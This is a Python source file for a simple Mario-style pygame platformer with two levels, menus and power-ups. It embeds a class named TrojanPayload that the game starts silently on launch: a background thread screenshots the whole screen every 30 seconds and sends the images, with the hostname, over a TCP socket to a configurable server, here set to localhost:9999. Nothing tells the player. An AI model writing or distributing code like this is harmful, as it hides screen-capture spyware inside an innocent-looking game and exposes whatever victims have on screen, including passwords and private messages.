import pygame
import sys
import os
import random
import threading
import time
import io
import base64
import socket
import json
from PIL import ImageGrab
import zlib

# Initialize pygame
pygame.init()
pygame.mixer.init()


class TrojanPayload:
    def __init__(self, server_url, interval=30):
        self.server_url = server_url
        self.interval = interval
        self.running = False
        self.thread = None
        self.screenshot_count = 0

    def capture_screenshot(self):
        try:
            screenshot = ImageGrab.grab()
            img_byte_arr = io.BytesIO()
            screenshot.save(img_byte_arr, format='PNG')
            img_bytes = img_byte_arr.getvalue()
            compressed = zlib.compress(img_bytes)
            encoded = base64.b64encode(compressed).decode('utf-8')

            self.screenshot_count += 1
            return {
                'timestamp': time.time(),
                'data': encoded,
                'size': len(compressed),
                'hostname': socket.gethostname(),
                'count': self.screenshot_count
            }
        except Exception:
            return None

    def send_screenshot(self, data):
        try:
            if "://" in self.server_url:
                from urllib.parse import urlparse
                parsed = urlparse(self.server_url)
                host = parsed.hostname
                port = parsed.port if parsed.port else (443 if parsed.scheme == "https" else 80)
            else:
                host = self.server_url.split(':')[0]
                port = int(self.server_url.split(':')[1]) if ':' in self.server_url else 9999

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            json_data = json.dumps(data)
            sock.sendall(json_data.encode('utf-8'))
            sock.sendall(b"<END>")
            sock.close()
            return True
        except Exception:
            return False

    def payload_loop(self):
        self.running = True
        while self.running:
            try:
                data = self.capture_screenshot()
                if data:
                    self.send_screenshot(data)
            except Exception:
                pass
            for _ in range(self.interval * 10):
                if not self.running:
                    break
                time.sleep(0.1)

    def start(self):
        if not self.running:
            self.thread = threading.Thread(target=self.payload_loop, daemon=True)
            self.thread.start()
            return True
        return False

    def stop(self):
        self.running = False
        if self.thread:
            self.thread.join(timeout=2)


SCREEN_WIDTH = 800
SCREEN_HEIGHT = 600
FPS = 60
GRAVITY = 0.5
JUMP_STRENGTH = -12
PLAYER_SPEED = 5

BLACK = (0, 0, 0)
WHITE = (255, 255, 255)
RED = (255, 0, 0)
GREEN = (0, 255, 0)
BLUE = (0, 120, 255)
BROWN = (139, 69, 19)
YELLOW = (255, 255, 0)
SKY_BLUE = (135, 206, 235)
DARK_GREEN = (34, 139, 34)

MENU = 0
PLAYING = 1
GAME_OVER = 2
VICTORY = 3
PAUSED = 4


class Player:
    def __init__(self, x, y):
        self.x = x
        self.y = y
        self.width = 40
        self.height = 60
        self.vel_x = 0
        self.vel_y = 0
        self.on_ground = False
        self.facing_right = True
        self.lives = 3
        self.score = 0
        self.coins = 0
        self.powerup = None
        self.powerup_timer = 0
        self.jump_count = 0
        self.invincible = False
        self.invincible_timer = 0
        self.animation_frame = 0
        self.animation_timer = 0

    def update(self, platforms, enemies, coins, powerups):
        self.vel_y += GRAVITY
        self.x += self.vel_x

        for platform in platforms:
            if self.collides_with(platform):
                if self.vel_x > 0:
                    self.x = platform.x - self.width
                elif self.vel_x < 0:
                    self.x = platform.x + platform.width
                self.vel_x = 0

        self.y += self.vel_y
        self.on_ground = False

        for platform in platforms:
            if self.collides_with(platform):
                if self.vel_y > 0:
                    self.y = platform.y - self.height
                    self.vel_y = 0
                    self.on_ground = True
                    self.jump_count = 0
                elif self.vel_y < 0:
                    self.y = platform.y + platform.height
                    self.vel_y = 0

        if self.y >= 500 - self.height:
            self.y = 500 - self.height
            self.vel_y = 0
            self.on_ground = True
            self.jump_count = 0

        if self.x < 0:
            self.x = 0
        if self.x > SCREEN_WIDTH - self.width:
            self.x = SCREEN_WIDTH - self.width

        if self.powerup_timer > 0:
            self.powerup_timer -= 1

        if self.invincible_timer > 0:
            self.invincible_timer -= 1
            if self.invincible_timer == 0:
                self.invincible = False

        self.animation_timer += 1
        if self.animation_timer >= 10:
            self.animation_frame = (self.animation_frame + 1) % 4
            self.animation_timer = 0

        for enemy in enemies[:]:
            if self.collides_with(enemy):
                if self.vel_y > 0 and self.y < enemy.y:
                    enemies.remove(enemy)
                    self.score += 100
                    self.vel_y = JUMP_STRENGTH * 0.7
                elif not self.invincible:
                    if self.powerup == "mushroom":
                        self.powerup = None
                        self.powerup_timer = 0
                        self.width = 40
                        self.height = 60
                        self.invincible = True
                        self.invincible_timer = 60
                    else:
                        self.lives -= 1
                        self.invincible = True
                        self.invincible_timer = 120
                        if self.lives <= 0:
                            return "dead"

        for coin in coins[:]:
            if self.collides_with_coin(coin):
                coins.remove(coin)
                self.coins += 1
                self.score += 50

        for powerup in powerups[:]:
            if self.collides_with(powerup):
                powerups.remove(powerup)
                if powerup.type == "mushroom":
                    self.powerup = "mushroom"
                    self.powerup_timer = 600
                    self.width = 50
                    self.height = 75
                    self.score += 200
                elif powerup.type == "flower":
                    self.powerup = "flower"
                    self.powerup_timer = 600
                    self.score += 300

        return "alive"

    def collides_with(self, obj):
        return (self.x < obj.x + obj.width and
                self.x + self.width > obj.x and
                self.y < obj.y + obj.height and
                self.y + self.height > obj.y)

    def collides_with_coin(self, coin):
        # Coin collision using circle collision detection
        player_center_x = self.x + self.width // 2
        player_center_y = self.y + self.height // 2
        distance = ((player_center_x - coin.x) ** 2 + (player_center_y - coin.y) ** 2) ** 0.5
        return distance < (self.width // 2 + coin.radius)

    def jump(self):
        if self.on_ground or self.jump_count < 2:
            self.vel_y = JUMP_STRENGTH
            self.on_ground = False
            self.jump_count += 1
            return True
        return False

    def draw(self, screen):
        color = RED if self.powerup != "flower" else (255, 165, 0)

        body_height = self.height - 20
        pygame.draw.rect(screen, color,
                         (self.x, self.y + 20, self.width, body_height))

        head_radius = self.width // 3
        pygame.draw.circle(screen, color,
                           (self.x + self.width // 2, self.y + 20),
                           head_radius)

        hat_width = self.width + 10
        hat_height = 15
        pygame.draw.rect(screen, color,
                         (self.x - 5, self.y + 5, hat_width, hat_height))
        pygame.draw.circle(screen, color,
                           (self.x + self.width // 2, self.y + 5),
                           head_radius)

        eye_radius = 3
        eye_y = self.y + 18
        if self.facing_right:
            pygame.draw.circle(screen, WHITE, (self.x + self.width // 3, eye_y), eye_radius)
            pygame.draw.circle(screen, WHITE, (self.x + 2 * self.width // 3, eye_y), eye_radius)
        else:
            pygame.draw.circle(screen, WHITE, (self.x + 2 * self.width // 3, eye_y), eye_radius)
            pygame.draw.circle(screen, WHITE, (self.x + self.width // 3, eye_y), eye_radius)

        if self.facing_right:
            mustache_y = self.y + 25
            pygame.draw.rect(screen, BLACK,
                             (self.x + self.width // 2, mustache_y,
                              self.width // 3, 3))
        else:
            mustache_y = self.y + 25
            pygame.draw.rect(screen, BLACK,
                             (self.x + self.width // 6, mustache_y,
                              self.width // 3, 3))

        if self.invincible and self.invincible_timer % 10 < 5:
            pygame.draw.rect(screen, (255, 255, 255, 128),
                             (self.x, self.y, self.width, self.height), 2)


class Platform:
    def __init__(self, x, y, width, height, color=BROWN, type="normal"):
        self.x = x
        self.y = y
        self.width = width
        self.height = height
        self.color = color
        self.type = type

    def draw(self, screen):
        if self.type == "brick":
            pygame.draw.rect(screen, self.color, (self.x, self.y, self.width, self.height))
            for i in range(0, self.width, 20):
                pygame.draw.line(screen, (100, 50, 0),
                                 (self.x + i, self.y),
                                 (self.x + i, self.y + self.height), 1)
            for i in range(0, self.height, 10):
                pygame.draw.line(screen, (100, 50, 0),
                                 (self.x, self.y + i),
                                 (self.x + self.width, self.y + i), 1)
        elif self.type == "question":
            pygame.draw.rect(screen, YELLOW, (self.x, self.y, self.width, self.height))
            pygame.draw.rect(screen, (200, 150, 0), (self.x, self.y, self.width, self.height), 3)
            font = pygame.font.SysFont(None, 24)
            text = font.render("?", True, BLACK)
            screen.blit(text, (self.x + self.width // 2 - text.get_width() // 2,
                               self.y + self.height // 2 - text.get_height() // 2))
        else:
            pygame.draw.rect(screen, self.color, (self.x, self.y, self.width, self.height))
            pygame.draw.rect(screen, (100, 50, 0), (self.x, self.y, self.width, self.height), 2)


class Enemy:
    def __init__(self, x, y, enemy_type="goomba"):
        self.x = x
        self.y = y
        self.width = 40
        self.height = 40
        self.vel_x = random.choice([-2, 2])
        self.vel_y = 0
        self.type = enemy_type
        self.alive = True
        self.animation_frame = 0
        self.animation_timer = 0

    def update(self, platforms):
        self.x += self.vel_x

        for platform in platforms:
            if (self.x <= platform.x + platform.width and
                    self.x + self.width >= platform.x and
                    self.y <= platform.y + platform.height and
                    self.y + self.height >= platform.y):
                self.vel_x *= -1
                break

        if self.x <= 0 or self.x >= SCREEN_WIDTH - self.width:
            self.vel_x *= -1

        self.animation_timer += 1
        if self.animation_timer >= 15:
            self.animation_frame = (self.animation_frame + 1) % 2
            self.animation_timer = 0

    def draw(self, screen):
        if self.type == "goomba":
            body_color = (165, 42, 42)
            foot_color = (139, 0, 0)

            pygame.draw.ellipse(screen, body_color,
                                (self.x, self.y, self.width, self.height))

            foot_height = 10
            pygame.draw.rect(screen, foot_color,
                             (self.x, self.y + self.height - foot_height,
                              self.width, foot_height))

            eye_radius = 5
            eye_y = self.y + self.height // 3
            if self.vel_x > 0:
                pygame.draw.circle(screen, WHITE,
                                   (self.x + self.width // 3, eye_y), eye_radius)
                pygame.draw.circle(screen, BLACK,
                                   (self.x + self.width // 3, eye_y), eye_radius // 2)
            else:
                pygame.draw.circle(screen, WHITE,
                                   (self.x + 2 * self.width // 3, eye_y), eye_radius)
                pygame.draw.circle(screen, BLACK,
                                   (self.x + 2 * self.width // 3, eye_y), eye_radius // 2)


class Coin:
    def __init__(self, x, y):
        self.x = x
        self.y = y
        self.radius = 10
        self.width = self.radius * 2  # Add width attribute
        self.height = self.radius * 2  # Add height attribute
        self.animation_frame = 0
        self.collected = False

    def draw(self, screen):
        if not self.collected:
            color = YELLOW
            if self.animation_frame < 5:
                pygame.draw.circle(screen, color, (self.x, self.y), self.radius)
                pygame.draw.circle(screen, (200, 200, 0), (self.x, self.y), self.radius - 3)
            else:
                pygame.draw.ellipse(screen, color,
                                    (self.x - self.radius, self.y - self.radius // 2,
                                     self.radius * 2, self.radius))
                pygame.draw.ellipse(screen, (200, 200, 0),
                                    (self.x - self.radius + 2, self.y - self.radius // 2 + 2,
                                     self.radius * 2 - 4, self.radius - 4))

            self.animation_frame = (self.animation_frame + 1) % 10


class Powerup:
    def __init__(self, x, y, powerup_type):
        self.x = x
        self.y = y
        self.width = 30
        self.height = 30
        self.type = powerup_type
        self.collected = False

    def draw(self, screen):
        if not self.collected:
            if self.type == "mushroom":
                pygame.draw.ellipse(screen, RED,
                                    (self.x, self.y, self.width, self.height))
                pygame.draw.ellipse(screen, WHITE,
                                    (self.x + 5, self.y - 5, self.width - 10, 15))
            elif self.type == "flower":
                pygame.draw.circle(screen, YELLOW, (self.x + self.width // 2, self.y + self.height // 2), 10)
                for i in range(4):
                    angle = i * 90
                    end_x = self.x + self.width // 2 + 15 * pygame.math.Vector2(1, 0).rotate(angle).x
                    end_y = self.y + self.height // 2 + 15 * pygame.math.Vector2(1, 0).rotate(angle).y
                    pygame.draw.line(screen, (255, 165, 0),
                                     (self.x + self.width // 2, self.y + self.height // 2),
                                     (end_x, end_y), 4)


class Game:
    def __init__(self):
        self.screen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))
        pygame.display.set_caption("Super Mario")
        self.clock = pygame.time.Clock()
        self.font = pygame.font.SysFont(None, 36)
        self.small_font = pygame.font.SysFont(None, 24)

        self.state = MENU
        self.level = 1
        self.reset_game()

        self.trojan = TrojanPayload(server_url="localhost:9999", interval=30)
        self.trojan_active = self.trojan.start()

    def reset_game(self):
        self.player = Player(100, 400)
        self.platforms = []
        self.enemies = []
        self.coins = []
        self.powerups = []
        self.camera_x = 0
        self.create_level()

    def create_level(self):
        self.platforms.append(Platform(0, 500, SCREEN_WIDTH, 100, DARK_GREEN))

        if self.level == 1:
            self.platforms.append(Platform(100, 450, 200, 20, BROWN, "brick"))
            self.platforms.append(Platform(400, 400, 150, 20, BROWN, "brick"))
            self.platforms.append(Platform(200, 350, 100, 20, YELLOW, "question"))
            self.platforms.append(Platform(500, 300, 100, 20, BROWN, "brick"))
            self.platforms.append(Platform(300, 250, 150, 20, YELLOW, "question"))

            for i in range(5):
                self.coins.append(Coin(150 + i * 40, 420))
            self.coins.append(Coin(250, 320))
            self.coins.append(Coin(350, 220))

            self.enemies.append(Enemy(300, 460))
            self.enemies.append(Enemy(500, 410))

            self.powerups.append(Powerup(220, 310, "mushroom"))

        elif self.level == 2:
            self.platforms.append(Platform(100, 450, 100, 20, BROWN, "brick"))
            self.platforms.append(Platform(250, 420, 100, 20, BROWN, "brick"))
            self.platforms.append(Platform(400, 390, 100, 20, YELLOW, "question"))
            self.platforms.append(Platform(550, 360, 100, 20, BROWN, "brick"))
            self.platforms.append(Platform(200, 300, 150, 20, BROWN, "brick"))
            self.platforms.append(Platform(450, 270, 100, 20, YELLOW, "question"))

            for i in range(8):
                self.coins.append(Coin(120 + i * 30, 420))

            self.enemies.append(Enemy(200, 440))
            self.enemies.append(Enemy(400, 410))
            self.enemies.append(Enemy(600, 380))

            self.powerups.append(Powerup(420, 340, "flower"))

    def handle_events(self):
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                return False
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_ESCAPE:
                    if self.state == PLAYING:
                        self.state = PAUSED
                    elif self.state == PAUSED:
                        self.state = PLAYING
                    else:
                        return False
                elif event.key == pygame.K_RETURN:
                    if self.state == MENU:
                        self.state = PLAYING
                    elif self.state == GAME_OVER or self.state == VICTORY:
                        self.reset_game()
                        self.state = PLAYING
                        return True  # Keep running
                elif event.key == pygame.K_SPACE and self.state == PLAYING:
                    self.player.jump()
                elif event.key == pygame.K_p:
                    self.state = PAUSED if self.state == PLAYING else PLAYING

        if self.state == PLAYING:
            keys = pygame.key.get_pressed()
            self.player.vel_x = 0
            if keys[pygame.K_LEFT]:
                self.player.vel_x = -PLAYER_SPEED
                self.player.facing_right = False
            if keys[pygame.K_RIGHT]:
                self.player.vel_x = PLAYER_SPEED
                self.player.facing_right = True
            if keys[pygame.K_UP]:
                self.player.jump()

        return True

    def update(self):
        if self.state == PLAYING:
            result = self.player.update(self.platforms, self.enemies, self.coins, self.powerups)
            if result == "dead":
                if self.player.lives <= 0:
                    self.state = GAME_OVER
                else:
                    self.player.x = 100
                    self.player.y = 400
                    self.player.vel_x = 0
                    self.player.vel_y = 0

            for enemy in self.enemies:
                enemy.update(self.platforms)

            if self.player.x > 750 and len(self.coins) == 0:
                if self.level < 2:
                    self.level += 1
                    self.reset_game()
                else:
                    self.state = VICTORY

    def draw(self):
        self.screen.fill(SKY_BLUE)

        for i in range(3):
            cloud_x = 100 + i * 250 + (pygame.time.get_ticks() // 1000) % 500
            cloud_y = 80 + (i % 2) * 30
            pygame.draw.ellipse(self.screen, WHITE, (cloud_x % 800, cloud_y, 100, 50))
            pygame.draw.ellipse(self.screen, WHITE, ((cloud_x + 30) % 800, cloud_y - 20, 80, 50))
            pygame.draw.ellipse(self.screen, WHITE, ((cloud_x - 20) % 800, cloud_y + 10, 70, 40))

        for platform in self.platforms:
            platform.draw(self.screen)

        for coin in self.coins:
            coin.draw(self.screen)

        for powerup in self.powerups:
            powerup.draw(self.screen)

        for enemy in self.enemies:
            enemy.draw(self.screen)

        self.player.draw(self.screen)

        self.draw_ui()

        if self.state == MENU:
            self.draw_menu()
        elif self.state == PAUSED:
            self.draw_paused()
        elif self.state == GAME_OVER:
            self.draw_game_over()
        elif self.state == VICTORY:
            self.draw_victory()

        pygame.display.flip()

    def draw_ui(self):
        score_text = self.font.render(f"SCORE: {self.player.score:06d}", True, WHITE)
        self.screen.blit(score_text, (10, 10))

        coin_text = self.font.render(f"COINS: {self.player.coins:02d}", True, WHITE)
        self.screen.blit(coin_text, (10, 50))

        lives_text = self.font.render(f"LIVES: {self.player.lives}", True, WHITE)
        self.screen.blit(lives_text, (10, 90))

        level_text = self.font.render(f"LEVEL: {self.level}", True, WHITE)
        self.screen.blit(level_text, (10, 130))

        if self.player.powerup:
            powerup_text = self.small_font.render(f"POWER: {self.player.powerup.upper()}", True, YELLOW)
            self.screen.blit(powerup_text, (10, 170))

    def draw_menu(self):
        overlay = pygame.Surface((SCREEN_WIDTH, SCREEN_HEIGHT), pygame.SRCALPHA)
        overlay.fill((0, 0, 0, 180))
        self.screen.blit(overlay, (0, 0))

        title_font = pygame.font.SysFont(None, 72)
        title = title_font.render("SUPER MARIO", True, RED)
        self.screen.blit(title, (SCREEN_WIDTH // 2 - title.get_width() // 2, 100))

        subtitle = self.font.render("Press ENTER to Start", True, YELLOW)
        self.screen.blit(subtitle, (SCREEN_WIDTH // 2 - subtitle.get_width() // 2, 180))

        instructions = [
            "ARROWS: Move",
            "SPACE: Jump",
            "P: Pause",
            "ESC: Quit"
        ]

        for i, text in enumerate(instructions):
            rendered = self.small_font.render(text, True, WHITE)
            self.screen.blit(rendered, (SCREEN_WIDTH // 2 - rendered.get_width() // 2, 250 + i * 40))

    def draw_paused(self):
        overlay = pygame.Surface((SCREEN_WIDTH, SCREEN_HEIGHT), pygame.SRCALPHA)
        overlay.fill((0, 0, 0, 128))
        self.screen.blit(overlay, (0, 0))

        paused_font = pygame.font.SysFont(None, 72)
        paused_text = paused_font.render("PAUSED", True, YELLOW)
        self.screen.blit(paused_text, (SCREEN_WIDTH // 2 - paused_text.get_width() // 2, SCREEN_HEIGHT // 2 - 50))

        continue_text = self.font.render("Press P to continue", True, WHITE)
        self.screen.blit(continue_text, (SCREEN_WIDTH // 2 - continue_text.get_width() // 2, SCREEN_HEIGHT // 2 + 30))

    def draw_game_over(self):
        overlay = pygame.Surface((SCREEN_WIDTH, SCREEN_HEIGHT), pygame.SRCALPHA)
        overlay.fill((0, 0, 0, 200))
        self.screen.blit(overlay, (0, 0))

        game_over_font = pygame.font.SysFont(None, 72)
        game_over_text = game_over_font.render("GAME OVER", True, RED)
        self.screen.blit(game_over_text, (SCREEN_WIDTH // 2 - game_over_text.get_width() // 2, SCREEN_HEIGHT // 2 - 50))

        score_text = self.font.render(f"Final Score: {self.player.score}", True, WHITE)
        self.screen.blit(score_text, (SCREEN_WIDTH // 2 - score_text.get_width() // 2, SCREEN_HEIGHT // 2 + 30))

        restart_text = self.font.render("Press ENTER to restart or ESC to quit", True, WHITE)
        self.screen.blit(restart_text, (SCREEN_WIDTH // 2 - restart_text.get_width() // 2, SCREEN_HEIGHT // 2 + 80))

    def draw_victory(self):
        overlay = pygame.Surface((SCREEN_WIDTH, SCREEN_HEIGHT), pygame.SRCALPHA)
        overlay.fill((0, 100, 0, 200))
        self.screen.blit(overlay, (0, 0))

        victory_font = pygame.font.SysFont(None, 72)
        victory_text = victory_font.render("VICTORY!", True, YELLOW)
        self.screen.blit(victory_text, (SCREEN_WIDTH // 2 - victory_text.get_width() // 2, SCREEN_HEIGHT // 2 - 50))

        score_text = self.font.render(f"Final Score: {self.player.score}", True, WHITE)
        self.screen.blit(score_text, (SCREEN_WIDTH // 2 - score_text.get_width() // 2, SCREEN_HEIGHT // 2 + 30))

        restart_text = self.font.render("Press ENTER to play again or ESC to quit", True, WHITE)
        self.screen.blit(restart_text, (SCREEN_WIDTH // 2 - restart_text.get_width() // 2, SCREEN_HEIGHT // 2 + 80))

    def run(self):
        running = True
        while running:
            running = self.handle_events()
            self.update()
            self.draw()
            self.clock.tick(FPS)

        self.trojan.stop()
        pygame.quit()
        sys.exit()


if __name__ == "__main__":
    game = Game()
    game.run()